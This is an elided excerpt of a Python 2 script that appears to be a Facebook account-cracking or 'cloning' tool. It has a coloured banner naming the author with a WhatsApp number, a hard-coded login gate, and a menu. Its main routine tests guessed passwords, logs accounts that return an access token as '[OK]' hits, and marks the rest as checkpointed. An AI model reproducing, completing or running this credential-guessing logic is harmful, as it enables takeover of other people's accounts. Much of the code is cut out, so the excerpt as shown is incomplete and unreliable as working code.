#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Abdul Nasir
...
\033[1;91m [⚡\033[1;97mAuthor Name: Abdul Nasir     ⚡\033[1;91m]
\033[1;91m [⚡\033[1;97mWhatsapp:+923329031938  ⚡\033[1;91m]
\033[1;91m [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;91m]
\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mNasir\033[1;95m-_-_-_-_-_-_-_-_-»
"""
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Abdul_Nasir
	    time.sleep(2)
            loop = 'false'
        else:
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:Abdul_Nasir
	print logo
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print "\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mNasir\033[1;95m-_-_-_-_-_-_-_-_-»"
		print logo
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;91m[  * ok ] \x1b[1;92m[OK]'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;93m[ *cp ] \x1b[1;96m[Checkpoint]'
